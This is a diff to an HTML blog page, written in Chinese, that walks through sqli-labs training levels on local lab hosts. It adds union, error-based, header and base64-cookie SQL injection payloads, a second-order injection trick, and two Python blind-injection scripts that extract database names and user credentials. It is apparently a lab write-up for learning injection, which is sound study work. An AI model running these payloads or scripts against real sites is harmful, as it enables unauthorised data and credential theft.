@@ -98,6 +98,8 @@
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143431292.png" alt="image-20231224143431292"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username ,id , password),3from users--+</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143529919.png" alt="image-20231224143529919"></p>
 <h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
 
@@ -335,7 +337,8 @@
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215223570.png" alt="image-20231224215223570"></p>
 <p>后续和Less11一样</p>
-<h3 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="Less13（盲注3）"><a href="#Less13（盲注3）" class="headerlink" title="Less13（盲注3）"></a>Less13（盲注3）</h3><p>布尔盲注post版</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>提示：You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ‘’1’’) and  password&#x3D;(‘’) LIMIT 0,1’ at line 1</p>
 <p>您的SQL语法有错误；请查看与MySQL服务器版本对应的手册，以获得在第1行的“1”）和密码&#x3D;（“”）LIMIT 0,1附近使用的正确语法</p>
@@ -343,7 +346,337 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) or 1=1-- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224215820022.png" alt="image-20231224215820022"></p>
+<p>有登陆成功的标志，但是页面没有其他回显。</p>
+<p>但是他之前尝试错误时爆出了错误，可以尝试报错注入</p>
+<p>双查询注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) union select count(*),concat(0x7e,database(),floor(rand(0)*2)) as a from information_schema.tables group by a -- -</span><br></pre></td></tr></table></figure>
 
+<p>数据库名字正常显示</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225093630363.png" alt="image-20231225093630363"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; ),0x7e),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p>多次尝试报错注入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225094148878.png" alt="image-20231225094148878"></p>
+<p>Subquery returns more than 1 row&#x2F;子查询返回1行以上</p>
+<p>应该是输出的内容太多无法正常输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),3)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225095557870.png" alt="image-20231225095557870"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 0,1)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225104709404.png" alt="image-20231225104709404"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,(select id from emails limit 0,1)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225104824179.png" alt="image-20231225104824179"></p>
+<p>布尔post盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 网站路径</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.40/sqli/Less-13/&quot;</span></span><br><span class="line"><span class="comment"># 判断长度的payload</span></span><br><span class="line">payload_len = <span class="string">&quot;&quot;&quot;a&#x27;) or length(</span></span><br><span class="line"><span class="string">	(database())</span></span><br><span class="line"><span class="string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 枚举字符的payload</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;a&#x27;) or ascii(</span></span><br><span class="line"><span class="string">    substr(</span></span><br><span class="line"><span class="string">        (database())</span></span><br><span class="line"><span class="string">    ,&#123;l&#125;,1)</span></span><br><span class="line"><span class="string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># post请求参数</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">&quot;uname&quot;</span> : <span class="string">&quot;a&#x27;) or 1 -- a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span> : <span class="string">&quot;Submit&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 判断长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLen</span>(<span class="params">payload_len</span>):</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 修改请求参数</span></span><br><span class="line">        data[<span class="string">&quot;uname&quot;</span>] = payload_len.<span class="built_in">format</span>(n = length)</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># 出现此内容为登录成功</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;测试成功，长度为：&#x27;</span>, length)</span><br><span class="line">            <span class="keyword">return</span> length;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在测试长度：&#x27;</span>, length)</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 枚举字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 从第一个字符开始截取</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 枚举字符的每一种可能性</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">            data[<span class="string">&quot;uname&quot;</span>] = payload_str.<span class="built_in">format</span>(l=l, n=n)</span><br><span class="line">            response = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">str</span> += <span class="built_in">chr</span>(n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第&#x27;</span>, l, <span class="string">&#x27;个字符枚举成功：&#x27;</span>,<span class="built_in">str</span> )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">length = getLen(payload_len)</span><br><span class="line">getStr(length)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225105238108.png" alt="image-20231225105238108"></p>
+<h3 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h3><p>试错试错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; or 1=1-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225105753459.png" alt="image-20231225105753459"></p>
+<p>无回显内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225105907726.png" alt="image-20231225105907726"></p>
+<p>有报错显示</p>
+<p>可以使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select count(*),concat(0x7e,database(),floor(rand(0)*2)) as a from information_schema.tables group by a -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225110045002.png" alt="image-20231225110045002"></p>
+<p>有报错回显，数据库名已出现，那其他部分与less13一样</p>
+<h3 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225110851661.png" alt="image-20231225110851661"></p>
+<p>无数据回显，无报错回显，情况符合时间盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or length(database())&gt;7-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225113003610.png" alt="image-20231225113003610"></p>
+<h3 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.45/sqli/Less-15/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span>  <span class="comment"># 使用可打印的ASCII范围32到127</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            mid = (start + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: <span class="string">f&#x27;admin&quot;) and if(ascii(substr((select group_concat(id,username,password) from users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = session.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(response.text)</span></span><br><span class="line">            <span class="comment"># print(len(response.text))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="comment"># 如果内容大于某个长度，假设SQL条件为真</span></span><br><span class="line">                start = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            <span class="comment"># 调试输出来理解过程</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;测试位置 <span class="subst">&#123;i&#125;</span>, 字符ASCII: <span class="subst">&#123;mid&#125;</span>, start = <span class="subst">&#123;start&#125;</span>, end = <span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 循环结束后需要重新设置mid点</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        found_char = <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:  <span class="comment"># 如果ASCII是32（空格），可能表示结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name += found_char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到的字符: <span class="subst">&#123;found_char&#125;</span>, 目前的数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225112458014.png" alt="image-20231225112458014"></p>
+<h3 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h3><p>修改User Name中的内容时，无论如何都无法得出正确回显</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225141919638.png" alt="image-20231225141919638"></p>
+<p>可以从标题看出这道题的主题是重置密码，那就应该把重心放在重置密码上</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225142128959.png" alt="image-20231225142128959"></p>
+<p>从这句话可以判断出必须需要一个正确的用户名才能在password上做文章</p>
+<p>User Name：admin（默认）</p>
+<p>报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>输入该代码直接爆用户名称。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225142504765.png" alt="image-20231225142504765"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database() limit 0,1)),1) #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225152352307.png" alt="image-20231225152352307"></p>
+<p>其他部分参考Less5</p>
+<h3 id="Less18（抓包）"><a href="#Less18（抓包）" class="headerlink" title="Less18（抓包）"></a>Less18（抓包）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: 1</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225153004994.png" alt="image-20231225153004994"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 192.168.2.11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT users.username, users.password FROM users WHERE users.username=&#x27;1\&#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>利用yakit抓包</p>
+<p>登陆成功</p>
+<p>下面内容是yakit中的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:...&#x27;OR updatexml(1,concat(&quot;!&quot;,database()),2) OR&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/sqli.assets/image-20231225190545759.png" alt="image-20231225190545759"></p>
+<p>数据库已显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;security&#x27;)),2) OR &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225191349827.png" alt="image-20231225191349827"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#x27;security&#x27; AND table_name = &#x27;users&#x27;)),2) OR &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225191910517.png" alt="image-20231225191910517"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225192428659.png" alt="image-20231225192428659"></p>
+<h3 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225194632112.png" alt="image-20231225194632112"></p>
+<p>该题与Less18几乎一样，可以用同样的方法，抓包，再在包中更改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.2.45/sqli/Less-19/1&#x27;,updatexml (1,concat(0x5c,(select database()),0x5c),1))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225194012190.png" alt="image-20231225194012190"></p>
+<p>后续和Less18一样。</p>
+<h3 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h3><p>情况与Less18基本一样，需要找到抓包注入点</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225194709698.png" alt="image-20231225194709698"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27;and updatexml (1,concat(0x5c,(select database()),0x5c),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225195503042.png" alt="image-20231225195503042"></p>
+<p>后续跟less18一样</p>
+<h3 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h3><p>登陆成功后，格式与less18基本相同，一样是抓包注入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225195813727.png" alt="image-20231225195813727"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D&#x27;)and updatexml (1,concat(0x5c,(select database()),0x5c),1)#</span><br></pre></td></tr></table></figure>
+
+<p>虽然页面报错了，但是报的是乱码，结合<strong>uname</strong>&#x3D;<strong>YWRtaW4%3D</strong>，可以判断这是一种编码方式，查询得知这是Base64编码。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225201749085.png" alt="image-20231225201749085"></p>
+<p>百度一个转换器转换需要用到的语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)and updatexml (1,concat(0x5c,(select database()),0x5c),1)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JylhbmQgdXBkYXRleG1sICgxLGNvbmNhdCgweDVjLChzZWxlY3QgZGF0YWJhc2UoKSksMHg1YyksMSkj</span><br></pre></td></tr></table></figure>
+
+<p>直接复制上去会报错说编码格式错误</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225202730634.png" alt="image-20231225202730634"></p>
+<p>需要将uname先解码，在将解码后内容与原语句一起编码在运行才不会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4nKW9yIHVwZGF0ZXhtbCAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGRhdGFiYXNlKCkpLDB4NWMpLDEpIw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225203006815.png" alt="image-20231225203006815"></p>
+<p>除了需要编码转换其他与less18相似。</p>
+<h3 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225203327103.png" alt="image-20231225203327103"></p>
+<p>与Less18相似，采用抓包注入</p>
+<p>抓包展示</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225203558951.png" alt="image-20231225203558951"></p>
+<p>又看到了base64格式的</p>
+<p>先解码原base64编码,加上报错代码逐一尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;and updatexml (1,concat(0x5c,(select database()),0x5c),1)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iYW5kIHVwZGF0ZXhtbCAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGRhdGFiYXNlKCkpLDB4NWMpLDEpIw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225204027807.png" alt="image-20231225204027807"></p>
+<p>后续则是解码编码，其他部分与Less相似。</p>
+<h3 id="Less23（重回get）"><a href="#Less23（重回get）" class="headerlink" title="Less23（重回get）"></a>Less23（重回get）</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225204250801.png" alt="image-20231225204250801"></p>
+<p>Please input the ID as parameter with numeric value&#x2F;请输入ID作为带数值的参数。</p>
+<p>重新回归get方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225205155438.png" alt="image-20231225205155438"></p>
+<p>开始试错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)xxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225205555216.png" alt="image-20231225205555216"></p>
+<p>无论后面后续是什么内容都是正常显示，应该不是这条语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225205825312.png" alt="image-20231225205825312"></p>
+<p>成功试出闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225210230119.png" alt="image-20231225210230119"></p>
+<p>根据联合注入判断回显位是2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225210515334.png" alt="image-20231225210515334"></p>
+<p>其他参考Less1</p>
+<h3 id="Less24"><a href="#Less24" class="headerlink" title="Less24"></a>Less24</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225214126468.png" alt="image-20231225214126468"></p>
+<p>忘记密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225214153077.png" alt="image-20231225214153077"></p>
+<p>注册界面</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225214628893.png" alt="image-20231225214628893"></p>
+<p>确定有一个admin用户</p>
+<p>新建一个用户</p>
+<p>账号为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>的用户</p>
+<p>密码随便设置。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225214846799.png" alt="image-20231225214846799"></p>
+<p>登陆刚刚创建的用户</p>
+<p>修改改用户的密码，随便搞一个就行</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225215010579.png" alt="image-20231225215010579"></p>
+<p>回到登陆界面，账号输入admin，密码输入admin’– -的密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231225215111674.png" alt="image-20231225215111674"></p>
+<p>登陆成功。</p>
+<h3 id="Less25"><a href="#Less25" class="headerlink" title="Less25"></a>Less25</h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231226161906781.png" alt="image-20231226161906781"></p>
+<p>网页提示：all your ‘or’ and ‘and’ belong to us&#x2F;你所有的“or”和“and”都属于我们</p>
+<p>说明网页会过滤or还有and这个几个字母</p>
+<p>试闭环试出来</p>
